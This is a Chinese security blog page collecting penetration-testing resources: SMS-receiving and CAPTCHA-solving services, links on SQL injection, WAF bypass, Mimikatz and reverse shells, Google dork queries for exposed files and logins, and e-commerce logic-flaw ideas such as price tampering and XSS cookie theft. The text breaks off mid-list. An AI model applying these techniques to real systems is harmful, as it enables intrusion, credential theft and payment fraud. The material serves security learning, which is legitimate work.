<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>杂项知识汇总 | ascotbe</title><meta name="author" content="ascotbe"><meta name="copyright" content="ascotbe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！  验证码相关 手机短信接码   国内平台 https:&#x2F;&#x2F;www.pdflibr.comhttps:&#x2F;&#x2F;www.visitorsms.com&#x2F;cnhttps:&#x2F;&#x2F;www.becmd.comhttp:&#x2F;&#x2F;www.114sim.comhttps:">
<meta property="og:type" content="article">
<meta property="og:title" content="杂项知识汇总">
<meta property="og:url" content="https://www.ascotbe.com/2019/09/05/KnowledgeNavigationFile/index.html">
<meta property="og:site_name" content="ascotbe">
<meta property="og:description" content="郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！  验证码相关 手机短信接码   国内平台 https:&#x2F;&#x2F;www.pdflibr.comhttps:&#x2F;&#x2F;www.visitorsms.com&#x2F;cnhttps:&#x2F;&#x2F;www.becmd.comhttp:&#x2F;&#x2F;www.114sim.comhttps:">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/43.jpg">
<meta property="article:published_time" content="2019-09-05T13:45:42.000Z">
<meta property="article:modified_time" content="2023-01-05T06:17:01.632Z">
<meta property="article:author" content="ascotbe">
<meta property="article:tag" content="XSS">
<meta property="article:tag" content="信息收集">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/43.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://www.ascotbe.com/2019/09/05/KnowledgeNavigationFile/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"本篇文章距最近一次更新已过去","messageNext":"天，文章内容有可能过时."},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: ascotbe","link":"链接: ","source":"来源: ascotbe","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '杂项知识汇总',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-01-05 14:17:01'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="//at.alicdn.com/t/c/font_3133731_25dh7dx5bg4.css"><link rel="stylesheet" href="/css/beating_icon.css"><link rel="stylesheet" href="/css/mouse.css"><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="ascotbe" type="application/atom+xml">
<link href="https://cdn.bootcss.com/KaTeX/0.11.1/katex.min.css" rel="stylesheet" /></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "/img/loading.gif" data-lazy-src="/img/avatar.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">71</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">72</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">25</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-dongwu"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 内容</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw iconfont icon-danger-full"></i><span> 归档</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw iconfont icon-zhiwu"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw iconfont icon-tubiaozhizuomoban-"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/Loophole"><i class="fa-fw iconfont icon-godot-assets1"></i><span> 漏洞</span></a></div><div class="menus_item"><a class="site-page" href="/Gallery"><i class="fa-fw iconfont icon-forms_dota_dragon_big"></i><span> 图片</span></a></div><div class="menus_item"><a class="site-page" href="/Link/"><i class="fa-fw iconfont icon-FaceID"></i><span> 友联</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-maomi_touxiang"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/Ascotbe/Image/master/Blog/43.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ascotbe</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-dongwu"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 内容</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw iconfont icon-danger-full"></i><span> 归档</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw iconfont icon-zhiwu"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw iconfont icon-tubiaozhizuomoban-"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/Loophole"><i class="fa-fw iconfont icon-godot-assets1"></i><span> 漏洞</span></a></div><div class="menus_item"><a class="site-page" href="/Gallery"><i class="fa-fw iconfont icon-forms_dota_dragon_big"></i><span> 图片</span></a></div><div class="menus_item"><a class="site-page" href="/Link/"><i class="fa-fw iconfont icon-FaceID"></i><span> 友联</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-maomi_touxiang"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">杂项知识汇总</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-09-05T13:45:42.000Z" title="发表于 2019-09-05 21:45:42">2019-09-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.632Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">红蓝对抗</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">10.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>40分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="杂项知识汇总"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p>
</div>
<h2 id="验证码相关">验证码相关</h2>
<h3 id="手机短信接码">手机短信接码</h3>
<ul>
<li>
<p>国内平台</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">https://www.pdflibr.com</span><br><span class="line">https://www.visitorsms.com/cn</span><br><span class="line">https://www.becmd.com</span><br><span class="line">http://www.114sim.com</span><br><span class="line">https://yunduanxin.net</span><br><span class="line">http://www.smszk.com</span><br><span class="line">http://z-sms.com</span><br><span class="line">http://www.shejiinn.com</span><br><span class="line">https://sms.cngrok.com</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>国外平台</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">https://ch.freephonenum.com</span><br><span class="line">https://smsreceivefree.com</span><br><span class="line">https://zh.mytrashmobile.com</span><br><span class="line">https://www.receive-sms-online.info</span><br><span class="line">https://receiveasms.com</span><br><span class="line">https://sms-online.co/receive-free-sms</span><br><span class="line">https://receive-sms.com</span><br><span class="line">http://www.tay8.com/</span><br><span class="line">http://www.51ym.me/</span><br><span class="line">http://www.eobzz.com/newsUpPage/API.html</span><br><span class="line">http://47.90.98.47:9000/index.html</span><br><span class="line">http://www.xunma.net/Login.html</span><br><span class="line">http://www.ixinsms.com/</span><br><span class="line">http://www.mili02.com:9000/</span><br><span class="line">http://www.lema.pw/</span><br><span class="line">http://ma.d4z.cn/</span><br><span class="line">http://www.baiwanma.com/</span><br><span class="line">http://114.55.24.232/</span><br><span class="line">http://soft.hellotrue.com/</span><br><span class="line">http://www.shjmpt.com:8000/</span><br><span class="line">http://120.26.100.114:8888/ （以前的卓码， 捷码）</span><br><span class="line">http://www.6tudou.com:9000/download.html</span><br><span class="line">http://www.tianma168.com/</span><br><span class="line">http://www.ema666.com/</span><br><span class="line">http://yemapt.com/web/index.html</span><br><span class="line">http://www.baiwanma.com/</span><br><span class="line">http://www.yunsu01.com/</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="语音验证码">语音验证码</h3>
<ul>
<li>
<p>外星码</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://www.waixing.website</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>星辰码</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://www.xingchenma.com:9000/</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>星空码</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://www.xk-yzm.com/</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>60</code>码</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://www.60ma.net/</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>Thewolf</code>码</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://www.yyyzmpt.com/</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="自动打码">自动打码</h3>
<ul>
<li>
<p>若快</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://www.ruokuai.com/</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>超人</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://www.chaorendama.com/</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>联众</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">https://www.jsdati.com/ </span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="渗透文章总结-按类型分类">渗透文章总结(按类型分类)</h2>
<h3 id="ssrf漏洞">SSRF漏洞</h3>
<ul>
<li>
<p><code>SSRF </code>形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等等。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www.baidu,com/xxx.php?image=URL</span><br><span class="line">www.baidu.com就会请求URL的地址然后把URL的内容呈现给你</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="代码审计">代码审计</h3>
<ul>
<li>
<p><code>PHP</code>代码安全</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文章讲了各种函数的缺陷以及绕过方法</span><br><span class="line">https://blog.csdn.net/wy_97/article/details/79088218</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="sql常规注入">SQL常规注入</h3>
<ul>
<li>
<p><code>SQL</code>注入学习资料总结</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hn3ya大佬的总结，一个字香！</span><br><span class="line">https://www.cnblogs.com/hnsya/p/9370081.html</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>SqlMapTamper</code>详解及使用指南</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://blog.csdn.net/wn314/article/details/78872828</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>Sqlmap</code>中文手册</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文章里面讲的应该是我所能找到最详细的了</span><br><span class="line">https://blog.csdn.net/wy_97/article/details/79088218</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>SQLMAP API</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对API进行了详细的讲解</span><br><span class="line">https://www.freebuf.com/articles/web/204875.html</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>pentestmonkey </code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">覆盖了几乎所有数据库的文章</span><br><span class="line">http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>一篇文章带你深入理解 <code>SQL </code>盲注</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这篇文章对盲注讲解的挺不错的</span><br><span class="line">https://www.anquanke.com/post/id/170626</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>mysql</code>注入新姿势</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用hex和conv来注入</span><br><span class="line">https://www.cnblogs.com/Mrsm1th/p/6842300.html</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="header">header</h3>
<ul>
<li>
<p><code>HTTP</code>响应头和请求头信息对照表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">里面对header头有详细的对应讲解，贼好用</span><br><span class="line">http://tools.jb51.net/table/http_header</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="waf">WAF</h3>
<ul>
<li>
<p><code>WAF</code>绕过思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://drops.xmd5.com/static/drops/tips-7883.html</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="内网渗透">内网渗透</h3>
<ul>
<li>
<p>九种姿势运行<code>Mimikatz </code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文章距离我发博客以及过了1年了，绕过360已经不可能了但是姿势可以学习</span><br><span class="line">https://www.freebuf.com/articles/web/176796.html</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>Beef-XSS+Sunny-Ngrok</code>实现内网穿透</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">脑洞挺不错，值得学习</span><br><span class="line">https://www.freebuf.com/articles/web/207259.html</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="后渗透">后渗透</h3>
<ul>
<li>
<p>渗透之权限维持杂谈</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">里面介绍了Windows 和linux 的计划任务，开机启动，后门维权，有几个脑洞还不错</span><br><span class="line">https://www.anquanke.com/post/id/171891</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>反弹<code>Shell</code>总结</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">适合刚入门的新手</span><br><span class="line">https://www.freebuf.com/articles/system/178150.html</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>Netcat</code>反弹<code>Shell</code>详解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对Netcat做了详细用法介绍</span><br><span class="line">https://ascotbe.github.io/2019/08/19/Netcat%E5%8F%8D%E5%BC%B9Shell%E8%AF%A6%E8%A7%A3/</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="分享学习资料">分享学习资料</h3>
<ul>
<li>
<p><code>DEFCON</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DEFCON的资料分享网站</span><br><span class="line">https://media.defcon.org</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="工具库汇总">工具库汇总</h2>
<h3 id="火狐浏览器插件">火狐浏览器插件</h3>
<ul>
<li>
<p><code>Disable JavaScript</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">禁用网站的js</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>HackBar </code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">URL头部窗口可以进行URL加解密之类的信息，安装后会在F12里面</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>Hoxx VPN Proxy </code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VPN代理万一SSR免费账号没办法用了就用这个网页版的进行访问</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="谷歌浏览器插">谷歌浏览器插</h3>
<ul>
<li>
<p><code>Adblock Plus </code></p>
<p>免费的广告拦截器</p>
</li>
<li>
<p><code>Ghostery</code></p>
<p>隐私广告拦截工具<code>Adblock Plus</code> +<code>Ghostery</code>天下无敌</p>
</li>
<li>
<p><code>EditThisCookie</code></p>
<p><code>EditThisCookie</code>是一个<code>cookie</code>管理器。您可以添加，删除，编辑，搜索，锁定和屏蔽<code>cookies</code>！</p>
</li>
<li>
<p>云盘万能钥匙</p>
<p>百分之90的需要钥匙的百度网盘链接都不需要输入秘钥</p>
</li>
<li>
<p><code>Imagus</code></p>
<p>自动加载网页URL里面的原图，用html语句缩小的图片加载正常大小</p>
</li>
<li>
<p><code>Google</code> 翻译</p>
<p>不多BB就是吹爆</p>
</li>
<li>
<p><code>Image Downloader</code></p>
<p>一键下载当前页面的图片</p>
</li>
<li>
<p><code>Tampermonkey</code></p>
<p>里面又各种<code>JS</code>脚本贼好用</p>
</li>
</ul>
<h3 id="内网渗透">内网渗透</h3>
<ul>
<li>
<p><code>Mimikatz</code></p>
<p>运行能看<code>Windows</code>登录的账号密码，以及<code>hash</code>值等等。相关绕过在<code>Web</code>渗透分类的内网渗透里面</p>
</li>
</ul>
<h3 id="fuzz">FUZZ</h3>
<ul>
<li>
<p><code>cupp </code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cupp社工字典生成项目</span><br><span class="line">https://github.com/Mebus/cupp.git </span><br></pre></td></tr></table></figure>
</li>
<li>
<p>在线社工字典生成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://tools.mayter.cn/</span><br><span class="line">在线社工密码字典生成网站</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="网页相关工具">网页相关工具</h3>
<ul>
<li>
<p><code>JSFinder </code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在网站的JS文件中提取URL子域名的工具</span><br><span class="line">https://github.com/Threezh1/JSFinder</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="漏洞相关">漏洞相关</h3>
<ul>
<li>
<p><code>Vulhub </code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">搜索漏洞对应的CVE编号</span><br><span class="line">http://cve.scap.org.cn</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>Nist </code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">国外的漏洞查询库</span><br><span class="line">https://nvd.nist.gov</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="杂项工具">杂项工具</h3>
<ul>
<li>
<p>在线工具集合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">里面超多工具各种前端，编码，IP相关，DNS等等的集合</span><br><span class="line">https://tool.lu/index.html</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>CTFtools</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CTF常用的工具库</span><br><span class="line">https://www.ctftools.com/down/</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>Python </code>渗透库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">里面有很多渗透相关的库文件，相对挺全的。</span><br><span class="line">https://blog.csdn.net/qq_33020901/article/details/74536171</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="burp">Burp</h3>
<ul>
<li>
<p><code>Burp</code>扩展插件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">里面的插件是真的多，总有一个能瞒住你的需求</span><br><span class="line">https://github.com/snoopysecurity/awesome-burp-extensions</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="破解加密">破解加密</h3>
<ul>
<li>
<p><code>colab </code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Google免费试用GPU破解嘻哈值</span><br><span class="line">https://colab.research.google.com 目标网址</span><br><span class="line">https://www.freebuf.com/geek/195453.html 试用介绍</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>暴力破解工具汇总</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.freebuf.com/sectool/195910.html</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>免费帐号无法访问绕过方法<br>
<img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/%E5%A4%A7%E6%9D%82%E7%83%A9/SSR.png" alt="1"></p>
</li>
</ul>
<h2 id="应急响应">应急响应</h2>
<h3 id="linux">Linux</h3>
<ul>
<li>
<p>应急响应常用命令笔记</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">自己写的笔记</span><br><span class="line">https://ascotbe.github.io/2019/08/12/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>轻松了解<code>web</code>日志分析过程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">里面有Apache Logs Viewe工具的详细用法</span><br><span class="line">https://mp.weixin.qq.com/s/Z23aIuocXUKWOHuEloS15Q</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="windows">Windows</h3>
<ul>
<li>
<p>系统日志</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">里面讲了日志相关介绍，日志分析，被删文件如何恢复</span><br><span class="line">https://www.freebuf.com/vuls/175560.html</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>Windows </code>注册表取证分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文章讲了如何对注册列表进行取证</span><br><span class="line">https://www.anquanke.com/post/id/169435</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>应急响应处置流程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows应急响应的大致流程介绍</span><br><span class="line">https://www.freebuf.com/articles/network/203494.html</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="渗透姿势总结">渗透姿势总结</h2>
<h3 id="域名信息收集">域名信息收集</h3>
<ul>
<li>
<p>你需要知道哪些<code>domain</code>是该公司的，主要通过手工来查看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">网站的关于页面／网站地图</span><br><span class="line">whois反查</span><br><span class="line">一些网站里面的跳转请求（也可以关注一下app）</span><br><span class="line">还有就是百度，有些会在title 和 copyright信息里面出现该公司的信息</span><br><span class="line">网站html源码：主要就是一些图片、js、css等，也会出现一些域名(源码里面惊喜巨他妈多有时候测试账号都会有</span><br><span class="line">apk反编译源码里面</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>搜集域名和<code>mail</code>地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用Google语法</span><br><span class="line">搜集敏感文件：site:xxx.com filetype:doc</span><br><span class="line">搜集管理后台：site:xxx.com 管理／site:xxx.com admin／site:xxx.com login</span><br><span class="line">搜集mail：site:xxx.com intext:@xxx.com／intext:@xxx.com</span><br><span class="line">搜集敏感web路径：site:xxx.com intitle:登录／site:xxx.com inurl:sql.php</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>Google Hacking</code>信息刺探的攻与防</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文章有语法详情和一些奇淫技巧，值得学习</span><br><span class="line">https://www.freebuf.com/articles/network/169601.html</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="敏感信息收集">敏感信息收集</h3>
<ul>
<li>
<p>大致的方法如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">github源代码：网上有工具（https://github.com/repoog/GitPrey）</span><br><span class="line">svn信息泄漏：这个只能用扫描器了</span><br><span class="line">敏感文件：比如数据库配置文件啦、网站源码啊、数据库备份文件等等</span><br><span class="line">敏感目录：网站后台目录／一些登录地址／一些接口目录</span><br><span class="line">email：邮箱命名规则、公司是否具有邮箱默认密码。</span><br><span class="line">员工号：很多oa、um、sso系统都是采用员工号登录的，所以知道员工号的规则很多时候能帮助我们进行撞库。</span><br><span class="line">商家信息：如果是一些具有商家系统的，能收集到一些商家账户（可以注册）就可以进入很多系统来测试了。</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="购物漏洞挖掘思路">购物漏洞挖掘思路</h3>
<ul>
<li>
<p>首先我们要选择</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">筛选涉及查询（是否可以SQL注入）</span><br><span class="line">加入购物车：商品数量是否可以为负</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>询问商家</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">跳转客服系统，跳转url中是否含有用户参数</span><br><span class="line">xss打客服cookie</span><br><span class="line">钓鱼+社工</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>下单</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">填地址，涉及插入（注入）、xss</span><br><span class="line">修改单价</span><br><span class="line">修改总额</span><br><span class="line">这里说明一下修改总额：</span><br><span class="line">情况1，就是我们可能会遇到可以使用优惠卷的情况，比如我们买了100的东西只能使用5块的优惠价，但是我有一张50的优惠卷是否可以使用；</span><br><span class="line">情况2，打折我们是否可以修改打折的折扣；</span><br><span class="line">情况3，我们是否可以修改运费，将运费改为负数；</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>备注</p>
